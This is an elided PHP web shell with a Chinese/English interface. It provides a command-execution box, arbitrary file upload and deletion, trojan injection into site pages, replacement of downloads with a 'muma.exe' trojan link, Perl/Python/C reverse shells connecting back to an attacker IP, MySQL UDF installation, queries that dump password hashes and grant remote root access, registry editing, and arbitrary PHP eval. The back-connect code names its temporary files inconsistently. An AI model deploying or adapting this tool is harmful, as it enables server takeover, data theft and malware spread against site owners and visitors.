...
function File_Act($array,$actall,$inver)
{
	...
	{
		$zip = new packdir;
		if($zip->packdir($array)){$b4che10r = $zip->out;header("Content-type: application/unknown");header("Accept-Ranges: bytes");header("Content-length: ".strlen($b4che10r));header("Content-disposition: attachment; filename=".$inver.";");echo $b4che10r;exit;}
		return '打包失败';
	}
	$i = 0;
	while($i < $count)
...
function search(str){
	...
	if(IE4){
		...
		else{if (n > 0){n = 0;search(str)}else alert(str + "... 未找到")}
	}
	return false
}
function CheckDate(){
...
function File_Soup($p)
{
	...
	$MSG_BOX = 'size of attachment could not bigger than:'.$UP_SIZE.', rename format(new.php),if empty,will not change filename';
	if(!empty($_POST['updir']))
	{
		if(count($_FILES['soup']) >= 1)
		{
			...
			foreach ($_FILES['soup']['error'] as $key => $error)
			{
				if ($error == UPLOAD_ERR_OK)
				{
					...
					$MSG_BOX .= File_Up($souptmp,File_Str($_POST['updir'].'/'.$soupname)) ? '<br>'.$soupname.'upfile success' : '<br>'.$soupname.'upfile faild';
				}
				$i++;
			}
		}
		...
		{
			$MSG_BOX = 'select file plz';
		}
	}
print<<<END
<div class="msgbox">{$MSG_BOX}</div>
<form method="POST" id="editor" action="?s=q&p={$THIS_DIR}" enctype="multipart/form-data">
<div class="actall">upfile to folder: <input type="text" name="updir" value="{$p}" style="width:531px;height:22px;"></div>
<div class="actall">attachment1 <input type="file" name="soup[]" style="width:400px;height:22px;"> rename <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
<div class="actall">attachment2 <input type="file" name="soup[]" style="width:400px;height:22px;"> rename <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
<div class="actall">attachment3 <input type="file" name="soup[]" style="width:400px;height:22px;"> rename <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
<div class="actall">attachment4 <input type="file" name="soup[]" style="width:400px;height:22px;"> rename <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
<div class="actall">attachment5 <input type="file" name="soup[]" style="width:400px;height:22px;"> rename <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
<div class="actall">attachment6 <input type="file" name="soup[]" style="width:400px;height:22px;"> rename <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
<div class="actall">attachment7 <input type="file" name="soup[]" style="width:400px;height:22px;"> rename <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
<div class="actall">attachment8 <input type="file" name="soup[]" style="width:400px;height:22px;"> rename <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
<div class="actall"><input class="bt" type="submit" value="upload"> <input class="bt" type="button" value="back" onclick="window.location='?s=a&p={$THIS_DIR}';"></div>
</form>
END;
}
...
<script type="text/javascript">
	...
	<input type="text" name="p" value="{$p}" style="width:950px;height:22px;">
	...
	<option value="C:/Documents and Settings/All Users/「开始」菜单/程序/启动"> start item (国内) </option>
	<option value="C:/Documents and Settings/All Users/Start Menu/Programs/Startup"> start item (国外) </option>
	<option value="C:/RECYCLER"> RECYCLER </option>
	<option value="C:/Program Files"> Program Files </option>
	</select> <input class="bt" type="submit" value="跳转"></form>
	<div style="margin-top:3px;"></div>
	<form method="POST" action="?s=a&p={$THIS_DIR}" enctype="multipart/form-data">
	<input class="bt" type="button" value="新建文件" onclick="Inputok('newfile.php','?s=p&fp={$THIS_DIR}&fn=');">
	<input class="bt" type="button" value="新建文件夹" onclick="Inputok('newdir','?s=a&p={$THIS_DIR}&dn=');"> 
	<input class="bt" type="button" value="批量上传" onclick="window.location='?s=q&p={$p}';"> 
	<input type="file" name="ufp" style="width:590px;height:22px;">
	<input type="text" name="ufn" style="width:205px;height:22px;">
...
<input class="bt" type="button" value="Time" onclick="CheckDate('2009-01-01 00:00:00','d');return false;"> 
<input class="bt" type="button" value="Package" onclick="SubmitUrl('package and download filename is: ','b4che10r.tar.gz','e');return false;"> 
...
<div class="actall" style="height:35px;"><input type="radio" name="incode" value="1" checked>在 &lt;/head&gt之前插入; 
<input type="radio" name="incode" value="2">在文件第一行插入 
<input type="radio" name="incode" value="3">在文件末尾插入</div>
<div class="actall" style="height:30px;"><input type="checkbox" name="gx" value="1" checked>自动去除重复代码 <input type="checkbox" name="gd" value="1" checked>保持文件时间不变</div>
<div class="actall" style="height:50px;"><input type="radio" name="gb" value="a" checked>适用于当前文件夹，子文件夹和文件
<br><input type="radio" name="gb" value="b">只适用于当前文件夹</div>
<div class="actall"><input class="bt" type="button" value="插入" onclick="autorun();"></div>
</form>
END;
return true;
}
...
<div class="actall" style="height:50px;"><input type="radio" name="qb" value="a" checked>适用于当前文件夹和所有子文件夹
<br><input type="radio" name="qb" value="b">只适用于当前文件夹</div>
<div class="actall"><input class="bt" type="button" value="开始" onclick="autoup();"></div>
</form>
END;
	return true;
}
...
function showth(th){
	if(th == 'a') document.getElementById('setauto').innerHTML = '<tr>Searchment</tr> <textarea name="tca" id="tca" style="width:610px;height:100px;"></textarea><br>地址 <textarea name="tcb" id="tcb" style="width:610px;height:100px;"></textarea>';
	if(th == 'b') document.getElementById('setauto').innerHTML = '<br><tr>Download Suffix</tr> <input type="text" name="tca" id="tca" value=".exe|.z0|.rar|.zip|.gz|.torrent" style="width:500px;"><br><br>&nbsp&nbsp&nbsp地址&nbsp&nbsp&nbsp<input type="text" name="tcb" id="tcb" value="http://www.baidu.com/download/muma.exe" style="width:500px;">';
	return true;
}
function autoup(){
...
<div class="actall" style="height:235px;"><input type="radio" name="th" value="a" onclick="showth('a')" checked>替换指定文件内容 <input type="radio" name="th" value="b" onclick="showth('b')">用指定文件替换（网址）<br>
<div id="setauto">Searchment:&nbsp <textarea name="tca" id="tca" style="width:610px;height:100px;"></textarea><br>地址: <textarea name="tcb" id="tcb" style="width:610px;height:100px;"></textarea></div></div>
<div class="actall" style="height:30px;"><input type="checkbox" name="td" value="1" checked>保持文件修改时间不变</div>
<div class="actall" style="height:50px;"><input type="radio" name="tb" value="a" checked>适用于当前文件夹和所有子文件夹
<br><input type="radio" name="tb" value="b">只适用于当前文件夹</div>
<div class="actall"><input class="bt" type="button" value="执行" onclick="autoup();"></div>
</form>
END;
	return true;
}
...
{
	if(!empty($_GET['df'])){echo $_GET['df'];if(@unlink($_GET['df'])){echo 'del success';}else{@chmod($_GET['df'],0666);echo @unlink($_GET['df']) ? ' del success' : ' del faild';} return false;}
	...
	$features_php = array('cha88.cn'=>'cha88.cn','read()'=>'->read()','readdir'=>'readdir(','return string soname'=>'returns string soname','eval()'=>'eval(gzinflate(','eval(base64_decode())'=>'eval(base64_decode(','eval($_)'=>'eval($_','eval ($_)'=>'eval ($_','copy()'=>'copy($_FILES','copy ()'=>'copy ($_FILES','move_uploaded_file()'=>'move_uploaded_file($_FILES','move_uploaded_file ()'=>'move_uploaded_file ($_FILES','str_replace()'=>'str_replace(\'\\\\\',\'/\',');
...
<div class="actall"><textarea name="show" style="width:720px;height:300px;">{$res}</textarea></div>
</form>
END;
	return true;
}
...
print<<<END
exec command<br> <input type="text" name="cmd" value="{$cmd}" style="width:600px;">
...
<br><br>Ports<br><input type="text" name="port" value="21|22|23|1433|1521|3306|3389|5432|5800|43958" style="width:600px;">
...
<div class="actall"><input class="bt" type="submit" value="执行"></div></form>
END;
	return true;
}
...
Your IP: <input type="text" name="yourip" value="{$yourip}" style="width:200px">
Your Port: <input type="text" name="yourport" value="12345" style="width:200px">
...
END;
	if((!empty($_POST['yourip'])) && (!empty($_POST['yourport'])))
	{
		if($_POST['use'] == 'perl')
		{
			...
			echo File_Write('/tmp/b4che10r_pl',base64_decode($back_connect_pl),'wb') ? 'create /tmp/b4che10r_pl success<br>' : 'create /tmp/b4che10r_pl faild<br>';
			$perlpath = Exec_Run('which perl');
			$perlpath = $perlpath ? chop($perlpath) : 'perl';
			echo Exec_Run($perlpath.' /tmp/b4che10r_pl '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'execute command faild' : 'execute command success';
		}
                if($_POST['use'] == 'python')
                {      
                        ...
                        echo File_Write('/tmp/b4che10r_py',base64_decode($back_connect_py),'wb') ? 'create /tmp/b4che10r_py success<br>' : 'create /tmp/b4che10r_py faild<br>';
                        $pypath = Exec_Run('which python');
                        $pypath = $pypath ? chop($pypath) : 'python';
                        echo Exec_Run($pypath.' /tmp/b4che10r_py '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'execute command faild' : 'execute command success';
                }      
		...
		if($_POST['use'] == 'c')
		{
			...
			echo File_Write('/tmp/b4che10r_bc.c',base64_decode($back_connect_c),'wb') ? 'create /tmp/b4che10r_bc.c success<br>' : 'create /tmp/b4che10r_bc.c faild<br>';
			$res = Exec_Run('gcc -o /tmp/angel_bc /tmp/angel_bc.c');
			@unlink('/tmp/b4che10r_bc.c');
			echo Exec_Run('/tmp/b4che10r_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'execute command success' : 'execute command faild';
		}
...
{   
	...
	else
	{
		...
		else
		{
			...
			{
				echo 'install dll success'.$dir.'<br>';
			}
		}
		mysql_query('DROP TABLE udf_temp', $link) or die(mysql_error());
...
Host: <input name="mysql_hostname" value="<?echo $mysql_hostname;?>" type="text"  style="width:100px" >
...
Host:<input type=text name=host>&nbsp&nbsp
Port:<input type=text name=port>&nbsp&nbsp
...
eof;
echo '<br><br>';
print("&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp本功能可以用于windows, 但通常需要php socket;")."<br />";
print("&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp也能用于linux,检查 phpinfo() 看看吧.")."<br />";
...
<center><div class="actall"><a href="?s=n">[execute Mysql 命令]</a> 
...
else
{
	if(!empty($_POST['msql']))
	{
		...
		{
			$MSG_BOX = 'execute sql 命令 success<br>';
                        while($row = @mysql_fetch_array($result)){for($k=0;$k<=count($row);$k++){$MSG_BOX = $MSG_BOX.$row[$k].'&nbsp&nbsp';}}
...
function nFull(i){
	...
	Str[0] = "select version();";
        Str[1] = "show databases;";
        Str[2] = "describe table_name;";
        Str[3] = "select User,Password from mysql.user;";
	Str[4] = "select load_file(0x633A5C5C77696E646F77735C73797374656D33325C5C696E65747372765C5C6D657461626173652E786D6C) FROM user into outfile 'D:/web/iis.txt'";
	Str[5] = "select 'testtest' into outfile '/var/www/html/test.txt';";
	Str[6] = "GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION;";
...
<select onchange="return nFull(options[selectedIndex].value)">
	<option value="0" selected>version</option>
        ...
        <option value="3">hashes</option>
	<option value="4">load_file</option>
	<option value="5">into dumpfile</option>
	<option value="6">skip_network</option>
</select>
<input class="bt" type="submit" value="execute">
END;
}
...
<html>
<br />
<h4>user define php code:<h4>
<form action="?s=p" method="POST">
<div><textarea name="phpcode" rows="20" cols="80">print_r(apache_get_modules());</textarea></div><br />
...
echo '<br><br>';
echo '&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspRead & Write &Del reg';
echo '<br><br>';
print<<<END
...
<input class="bt" type="submit" value="Read"></form></TD></TR><br><br>   
END;
...
print<<<END
<TR><form   action=""   method="post">   
<TD WIDTH=100 VALIGN=TOP ALIGN=CENTER>Wpath:      
...
&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<input type="hidden" name="action" value="write">  
<input class="bt" type="submit" value="write"></form></TD></TR><br><br><br>   
END;
...
<input class="bt" type="submit" value="Del"></form></TD></TR>   
END;
			...
			<div style="height:546px;">
				...
				<td width="140" align="center" valign="top">
					<ul class="listbg">
						...
						<li><a href="?s=b" id="t_1" onclick="switchTab('t_1')" target="main"> 插马 </a></li>
						<li><a href="?s=c" id="t_2" onclick="switchTab('t_2')" target="main"> 清马 </a></li>
						<li><a href="?s=d" id="t_3" onclick="switchTab('t_3')" target="main"> 批量替换 </a></li>
						<li><a href="?s=e" id="t_4" onclick="switchTab('t_4')" target="main"> 查马 </a></li>
						<li><a href="?s=f" id="t_5" onclick="switchTab('t_5')" target="main"> 服务器信息 </a></li>
						<li><a href="?s=g" id="t_6" onclick="switchTab('t_6')" target="main"> 执行cmd </a></li>
						<li><a href="?s=h" id="t_7" onclick="switchTab('t_7')" target="main"> API </a></li>
						...
						<li><a href="?s=k" id="t_10" onclick="switchTab('t_10')" target="main"> 漏洞扫描 </a></li>
						<li><a href="?s=l" id="t_11" onclick="switchTab('t_11')" target="main">Linux 反向链接 </a></li>
                                                <li><a href="?s=q" id="t_12" onclick="switchTab('t_12')" target="main">PHP 反向链接 </a></li>
						<li><a href="?s=m" id="t_13" onclick="switchTab('t_13')" target="main"> Mysql UDF </a></li>
						<li><a href="?s=n" id="t_14" onclick="switchTab('t_14')" target="main"> Mysql 链接 </a></li>
                                                <li><a href="?s=o" id="t_15" onclick="switchTab('t_15')" target="main">注册表管理 </a></li>
                                                <li><a href="?s=p" id="t_16" onclick="switchTab('t_16')" target="main"> Eval PHP Code </a></li>
						<li><a href="?s=logout" id="t_17" onclick="switchTab('t_17')"> Logout </a></li>
					</ul>
				</td>
				<td>
...
if($_COOKIE['admin_b4che10rpass'] != md5($password))
{
	...
	if(isset($_POST['b4che10rpass']))
	{
		...
		else{$MSG_TOP = 'What are you doing man ?';}
	}
	Root_Login($MSG_TOP);
	exit;
	ob_end_flush();
...
switch($s)
{
	...
	case "o" : phpreg(); break;
        case 'p' : phpcode();break;
        case 'q' : phpsocket();break;
